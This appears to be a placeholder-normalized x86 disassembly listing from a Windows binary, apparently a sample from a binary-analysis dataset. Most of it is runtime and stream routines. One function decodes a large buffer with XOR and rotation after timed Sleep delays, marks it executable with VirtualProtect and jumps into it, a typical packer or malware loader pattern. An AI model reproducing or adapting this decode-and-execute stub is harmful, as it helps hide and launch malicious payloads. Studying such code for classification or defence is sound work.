mov [ edx + 0x45 ] 0x1
push ebx
lea eax [ ebp - 0x220 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x2a
call sub_403520
push eax
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x1c ]
call sub_403430
push ebx
lea edx [ ebp - 0x1e8 ]
push edx
lea ecx [ ebp - 0x1c ]
call sub_403520
push eax
lea eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_403430
push ebx
lea ecx [ ebp - 0x178 ]
push ecx
lea ecx [ ebp - 0x1c ]
call sub_403520
push eax
lea edx [ ebp - 0x5c ]
push edx
lea ecx [ ebp - 0x1c ]
call sub_403430
push ebx
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_403520
push eax
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x1c ]
call sub_403430
push ebx
lea edx [ ebp - 0x1b0 ]
push edx
lea ecx [ ebp - 0x1c ]
call sub_403520
push eax
lea eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_403430
push ebx
lea ecx [ ebp - 0xd0 ]
push ecx
lea ecx [ ebp - 0x1c ]
call sub_403520
push eax
lea edx [ ebp - 0x5c ]
push edx
lea ecx [ ebp - 0x1c ]
call sub_403430
push ebx
lea eax [ ebp - 0x140 ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_403520
lea ecx [ ebp - 0x5c ]
push eax
push ecx
lea ecx [ ebp - 0x1c ]
call sub_403430
push r--data
push rw-data
call sub_402100
push eax
call sub_402910
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
add esp 0xc
cmp edi eax
je r-xdata
mov ecx [ eax ]
push eax
push ecx
lea edx [ ebp - 0x98 ]
push edx
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x2b
call sub_4035d0
mov eax [ ebp - 0x18 ]
push eax
call sub_406807
mov edi 0x10
add esp 0x4
cmp [ ebp - 0x110 ] edi
jb r-xdata
lea eax [ edi + 0xc ]
push eax
push rw-data
call sub_4029d0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_4027a0
mov edx [ esi ]
mov eax [ edx + 0x4 ]
test [ eax + esi + 0xc ] 0x6
mov [ ebp - 0x58 ] ebx
jne r-xdata
mov [ ebp - 0x110 ] esi
mov [ ebp - 0x114 ] ebx
mov [ ebp - 0x124 ] bl
cmp [ ebp - 0x12c ] edi
jb r-xdata
mov ecx [ ebp - 0x124 ]
push ecx
call sub_406807
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x58 ]
add ecx esi
cmp edx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x12c ] esi
mov [ ebp - 0x130 ] ebx
mov [ ebp - 0x140 ] bl
cmp [ ebp - 0xa0 ] edi
jb r-xdata
mov edx [ ebp - 0x140 ]
push edx
call sub_406807
add esp 0x4
cmp [ edi + 0x45 ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov [ ebp - 0x58 ] 0x4
mov [ ebp - 0xa0 ] esi
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xb4 ] bl
cmp [ ebp - 0xbc ] edi
jb r-xdata
mov eax [ ebp - 0xb4 ]
push eax
call sub_406807
add esp 0x4
mov eax [ ebp - 0x18 ]
cmp edi eax
jne r-xdata
mov eax [ edi + 0x8 ]
cmp [ eax + 0x45 ] bl
jne r-xdata
push ebx
push eax
call sub_4012c0
or eax 0x4
mov [ ebp - 0xbc ] esi
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xd0 ] bl
cmp [ ebp - 0x180 ] edi
jb r-xdata
mov ecx [ ebp - 0xd0 ]
push ecx
call sub_406807
add esp 0x4
mov esi 0xf
mov eax [ edi + 0x4 ]
cmp [ eax + 0x45 ] bl
jne r-xdata
mov edi eax
mov eax [ edi ]
cmp [ eax + 0x45 ] bl
jne r-xdata
mov [ ebp - 0x180 ] esi
mov [ ebp - 0x184 ] ebx
mov [ ebp - 0x194 ] bl
cmp [ ebp - 0x19c ] edi
jb r-xdata
mov edx [ ebp - 0x194 ]
push edx
call sub_406807
add esp 0x4
mov edi eax
cmp edi [ eax + 0x8 ]
jne r-xdata
mov edi eax
mov eax [ edi ]
cmp [ eax + 0x45 ] bl
je r-xdata
mov [ ebp - 0x19c ] esi
mov [ ebp - 0x1a0 ] ebx
mov [ ebp - 0x1b0 ] bl
cmp [ ebp - 0xd8 ] edi
jb r-xdata
mov eax [ ebp - 0x1b0 ]
push eax
call sub_406807
add esp 0x4
mov edi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] bl
je r-xdata
jmp r-xdata
mov [ ebp - 0xd8 ] esi
mov [ ebp - 0xdc ] ebx
mov [ ebp - 0xec ] bl
cmp [ ebp - 0xf4 ] edi
jb r-xdata
mov ecx [ ebp - 0xec ]
push ecx
call sub_406807
add esp 0x4
mov [ ebp - 0xf4 ] esi
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0x108 ] bl
cmp [ ebp - 0x148 ] edi
jb r-xdata
mov edx [ ebp - 0x108 ]
push edx
call sub_406807
add esp 0x4
mov [ ebp - 0x148 ] esi
mov [ ebp - 0x14c ] ebx
mov [ ebp - 0x15c ] bl
cmp [ ebp - 0x164 ] edi
jb r-xdata
mov eax [ ebp - 0x15c ]
push eax
call sub_406807
add esp 0x4
mov [ ebp - 0x164 ] esi
mov [ ebp - 0x168 ] ebx
mov [ ebp - 0x178 ] bl
cmp [ ebp - 0x1b8 ] edi
jb r-xdata
mov ecx [ ebp - 0x178 ]
push ecx
call sub_406807
add esp 0x4
mov [ ebp - 0x1b8 ] esi
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1cc ] bl
cmp [ ebp - 0x1d4 ] edi
jb r-xdata
mov edx [ ebp - 0x1cc ]
push edx
call sub_406807
add esp 0x4
mov [ ebp - 0x1d4 ] esi
mov [ ebp - 0x1d8 ] ebx
mov [ ebp - 0x1e8 ] bl
cmp [ ebp - 0x1f0 ] edi
jb r-xdata
mov eax [ ebp - 0x1e8 ]
push eax
call sub_406807
add esp 0x4
cmp [ ebp - 0x20c ] edi
pop edi
mov [ ebp - 0x1f0 ] esi
pop esi
mov [ ebp - 0x1f4 ] ebx
mov [ ebp - 0x204 ] bl
pop ebx
jb r-xdata
mov ecx [ ebp - 0x204 ]
push ecx
call sub_406807
add esp 0x4
mov ecx [ ebp - 0xc ]
xor eax eax
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x220 ]
push edx
call sub_406807
add esp 0x4
sub_404100
push ebp
mov ebp esp
push 0xffffffff
push sub_4138f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
cmp [ rw-data ] 0x0
mov [ ebp - 0x10 ] 0x200000
je r-xdata
mov ecx [ ebp - 0xc ]
xor eax eax
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
call [ GetTickCount@IAT ]
mov edi 0xf
mov [ ebp - 0x18 ] eax
xor ebx ebx
mov eax edi
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x3c ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp [ ebp - 0x2c ] ebx
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx eax
push ecx
lea edx [ ebp - 0x58 ]
push edx
call sub_403380
add esp 0xc
mov esi eax
lea eax [ ebp - 0x3c ]
cmp eax esi
je r-xdata
mov esi [ ebp - 0x3c ]
mov edi esi
cmp eax 0x10
jae r-xdata
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
mov eax [ ebp - 0x20 ]
push eax
push rw-data
push rw-data
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] 0x0
call sub_402640
cmp [ ebp - 0x28 ] 0x10
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x1
jae r-xdata
lea edi [ ebp - 0x3c ]
mov esi edi
push 0x15b
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] 0x0
call [ Sleep@IAT ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
call sub_406807
add esp 0x4
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x3c ] 0x0
cmp [ esi + 0x14 ] 0x10
jae r-xdata
mov ecx [ ebp - 0x3c ]
push ecx
call sub_406807
add esp 0x4
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x3c ]
mov eax [ ebp - 0x28 ]
cmp [ ebp - 0x28 ] 0x10
mov esi [ ebp - 0x3c ]
jae r-xdata
mov eax [ esi ]
mov [ ebp - 0x3c ] eax
mov [ esi ] ebx
mov eax [ esi + 0x10 ]
inc eax
push eax
lea edx [ ebp - 0x3c ]
push esi
push edx
call sub_406820
add esp 0xc
jmp r-xdata
sub edi esi
xor edi edi
jmp r-xdata
mov ecx [ ebp - 0x2c ]
shr ecx 0x2
lea edi [ esi + ecx * 4 ]
cmp esi edi
jae r-xdata
lea esi [ ebp - 0x3c ]
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x2c ] ecx
mov edx [ esi + 0x14 ]
mov [ ebp - 0x28 ] edx
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
mov [ esi ] 0x0
sub esi eax
xor esi esi
jmp r-xdata
cmp esi ebx
jne r-xdata
push 0x4
push 0x3000
push 0x200000
push ebx
call [ VirtualAlloc@IAT ]
mov esi eax
xor eax eax
lea ebx [ ebx ]
mov edi 0xf
mov edx [ ebp - 0x58 ]
push edx
call sub_406807
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ ebp - 0x58 ]
push ecx
push edi
push esi
lea ecx [ ebp - 0x3c ]
call sub_401ad0
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
mov edx [ ebp - 0x18 ]
mov ecx eax
and ecx 0x3
add ecx ecx
add ecx ecx
add ecx ecx
shr edx cl
mov ecx [ ebp - 0x2c ]
shr ecx 0x1
add ecx edi
xor dl [ ecx + eax ]
inc eax
mov [ eax + esi - 0x1 ] dl
cmp eax 0x200000
jb r-xdata
lea edi [ ebp - 0x3c ]
add esi 0x4
cmp esi edi
jb r-xdata
push 0xa
call [ Sleep@IAT ]
cmp [ ebp - 0x28 ] 0x10
mov edi [ ebp - 0x3c ]
jae r-xdata
cmp [ ebp - 0x28 ] 0x10
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov edx [ ebp - 0x18 ]
xor [ esi ] edx
mov eax esi
xor eax 0xf000
test ax ax
jne r-xdata
push 0x200000
mov [ ebp - 0x28 ] 0xf
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x14 ] esi
call sub_4044c3
mov edi [ esi ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push eax
add esi 0x4
push esi
mov [ ebp - 0x1c ] edi
call sub_401000
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x3c ]
push edx
call sub_406807
add esp 0x4
mov esi [ ebp - 0x10 ]
push esi
call sub_4044c3
mov edx [ ebp - 0x14 ]
push esi
mov edi eax
push edx
push edi
call sub_406330
add esp 0x10
xor esi esi
cmp [ ebp - 0x10 ] ebx
jbe r-xdata
xor ecx ecx
mov bl 0x1
test edi edi
je r-xdata
mov esi edi
cmp edi rw-data
jne r-xdata
mov eax 0xcccccccd
mul esi
shr edx 0x2
lea eax [ edx + edx * 4 ]
mov dl [ esi + edi ]
mov ecx esi
sub ecx eax
rol dl cl
inc esi
mov [ esi + edi - 0x1 ] dl
cmp esi [ ebp - 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x14 ] ecx
test ecx ecx
je r-xdata
call sub_404490
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x20 ]
push edx
push 0x40
push eax
push esi
call [ VirtualProtect@IAT ]
push ebx
call [ GetModuleHandleW@IAT ]
mov ecx eax
call esi
cmp [ ebp - 0x20 ] 0x100
jne r-xdata
mov eax [ ebp - 0x10 ]
push 0x4
push 0x3000
push eax
push ebx
call [ VirtualAlloc@IAT ]
mov ecx [ ebp - 0x10 ]
push ecx
mov esi eax
push rw-data
push esi
call sub_406330
add esp 0xc
mov dl [ ecx + esi ]
mov eax [ ebp - 0x18 ]
mov [ ecx + eax ] dl
inc ecx
cmp ecx edi
jb r-xdata
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax ecx
sub eax edx
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
call sub_4036f0
push ebx
push rw-data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test bl bl
je r-xdata
cmp [ ecx + esi ] 0xed
cmp [ ecx + esi ] 0xfe
jmp r-xdata
xor ebx ebx
inc esi
test bl bl
sete bl
jne r-xdata
sub_404490
push esi
call sub_407834
push r--data
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
call sub_40711d
push eax
call esi
pop esi
retn
mov esi [ TlsFree@IAT ]
sub_4044ce
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_4044ef
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_4044ce
leave
retn 0x8
sub_404510
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x8
sub_404551
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_404573
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_407bb4
pop ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_402ce0
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_404596
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
call sub_407bb4
pop ecx
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_402ce0
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_4045e8
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_406719
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_406c8a
int3
sub_404635
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_406719
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_406c8a
int3
sub_404682
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_406775
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_4046a8
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
leave
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_405ca5
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_405ccd
inc [ rw-data ]
mov eax [ rw-data ]
mov [ esi ] eax
sub_4046df
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_405ca5
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_405ccd
pop esi
leave
retn
inc eax
mov [ esi + 0x4 ] eax
sub_404709
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_405ca5
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_405ccd
pop edi
mov eax esi
pop esi
leave
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_404781
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
jmp r-xdata
pop esi
pop ebp
retn 0x4
cmp [ ecx + 0x14 ] al
je r-xdata
test eax eax
jne r-xdata
call sub_405d70
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov eax [ eax + 0x8 ]
mov eax [ eax + esi * 4 ]
jmp r-xdata
sub_4047bd
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x30 ]
mov ecx [ eax ]
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_4046df
mov eax esi
pop esi
leave
retn 0x4
sub_4047de
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_406100
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_404817
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x10
push ebx
mov ebx ecx
push esi
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x10 ]
push edi
push eax
mov [ ebx ] r--data
call sub_405beb
lea edi [ ebx + 0x8 ]
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x8
sub_404882
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_405ade
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_4048c9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_40613e
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_404903
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call sub_406330
mov eax [ ebp + 0xc ]
add esp 0xc
pop ebp
retn 0xc
sub_404930
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_406330
mov eax [ ebp + 0xc ]
add esp 0xc
pop ebp
retn 0x10
sub_404951
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40484c
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_40497e
mov edi edi
push esi
mov esi ecx
push edi
xor edi edi
push edi
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x201
mov [ esi + 0x18 ] 0x6
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call sub_4012c0
push 0x4
call sub_406c0a
pop ecx
cmp eax edi
je r-xdata
xor eax eax
mov ecx eax
call sub_40474d
jmp r-xdata
pop edi
mov [ esi + 0x30 ] eax
pop esi
retn
sub_4049ef
mov edx [ rw-data ]
push esi
mov esi rw-data
mov eax ecx
mov [ rw-data ] esi
test edx edx
je r-xdata
mov edx [ rw-data ]
test edx edx
je r-xdata
mov ecx [ edx ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + edx + 0x3c ] esi
mov edx [ rw-data ]
test edx edx
je r-xdata
mov ecx [ edx ]
mov ecx [ ecx + 0x4 ]
mov esi [ rw-data ]
mov [ ecx + edx + 0x3c ] esi
pop esi
retn
mov ecx [ edx ]
mov ecx [ ecx + 0x4 ]
mov esi [ rw-data ]
mov [ ecx + edx + 0x3c ] esi
sub_404a5b
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x38 ]
mov [ esi ] r--data
test edi edi
je r-xdata
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_4062c7
mov ecx edi
call sub_404769
push edi
call sub_406807
pop ecx
sub_404aad
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_404ad4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
xor eax eax
push edi
mov edi ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop edi
leave
retn 0xc
jg r-xdata
push ebx
push esi
jmp r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov ecx [ edi + 0x20 ]
cmp [ ecx ] eax
je r-xdata
cdq
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
mov eax [ edi + 0x30 ]
mov eax [ eax ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x1c ]
cmp eax 0xffffffff
je r-xdata
jg r-xdata
pop esi
pop ebx
mov ecx [ ebp + 0x8 ]
inc [ ebp + 0x8 ]
add [ ebp - 0x8 ] 0x1
mov [ ecx ] al
adc [ ebp - 0x4 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc [ ebp + 0x10 ] 0xffffffff
cmp [ ebp + 0x10 ] ebx
jg r-xdata
test esi esi
je r-xdata
xor eax eax
jl r-xdata
push esi
push [ ecx ]
push [ ebp + 0x8 ]
call sub_406330
add [ ebp + 0x8 ] esi
mov eax [ edi + 0x30 ]
add esp 0xc
add [ ebp - 0x8 ] esi
adc [ ebp - 0x4 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_404b9d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
xor eax eax
push edi
mov edi ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop edi
leave
retn 0xc
jg r-xdata
push ebx
push esi
jmp r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov ecx [ edi + 0x24 ]
cmp [ ecx ] eax
je r-xdata
cdq
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
mov eax [ edi + 0x34 ]
mov eax [ eax ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0xc ]
cmp eax 0xffffffff
je r-xdata
jg r-xdata
pop esi
pop ebx
inc [ ebp + 0x8 ]
add [ ebp - 0x8 ] 0x1
adc [ ebp - 0x4 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc [ ebp + 0x10 ] 0xffffffff
cmp [ ebp + 0x10 ] ebx
jg r-xdata
test esi esi
je r-xdata
xor eax eax
jl r-xdata
push esi
push [ ebp + 0x8 ]
push [ ecx ]
call sub_406330
add [ ebp + 0x8 ] esi
mov eax [ edi + 0x34 ]
add esp 0xc
add [ ebp - 0x8 ] esi
adc [ ebp - 0x4 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ eax ] esi
mov eax [ edi + 0x24 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_404c68
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x14
sub_404c90
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x20
sub_404cb8
mov edi edi
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx esi
call sub_4049d0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_404cdc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_404a5b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_404cfd
mov edx [ ecx + 0x10 ]
lea eax [ ecx + 0x48 ]
cmp [ edx ] eax
jne r-xdata
retn
mov eax [ ecx + 0x40 ]
push esi
mov esi [ ecx + 0x3c ]
mov [ edx ] esi
mov edx [ ecx + 0x20 ]
mov [ edx ] eax
mov ecx [ ecx + 0x30 ]
sub eax eax
mov [ ecx ] eax
pop esi
sub_404d1e
lea edx [ ecx + 0x18 ]
mov [ ecx + 0x20 ] edx
lea edx [ ecx + 0x1c ]
mov [ ecx + 0x24 ] edx
lea edx [ ecx + 0x28 ]
mov [ ecx + 0x30 ] edx
lea eax [ ecx + 0x8 ]
mov [ ecx + 0x10 ] eax
lea edx [ ecx + 0x2c ]
mov [ ecx + 0x34 ] edx
xor edx edx
lea eax [ ecx + 0xc ]
mov [ ecx + 0x14 ] eax
mov [ eax ] edx
mov eax [ ecx + 0x24 ]
mov [ eax ] edx
mov eax [ ecx + 0x34 ]
mov [ eax ] edx
mov eax [ ecx + 0x10 ]
mov [ eax ] edx
mov eax [ ecx + 0x20 ]
mov [ eax ] edx
mov eax [ ecx + 0x30 ]
mov [ eax ] edx
retn
sub_404d60
push 0x10
mov eax sub_413936
call sub_407aca
mov esi ecx
mov [ ebp - 0x10 ] esi
xor ebx ebx
push ebx
call sub_405ca5
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] bl
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] bl
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bl
mov [ ebp - 0x4 ] 0x4
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x8 ]
push esi
call sub_405ec1
pop ecx
pop ecx
mov eax esi
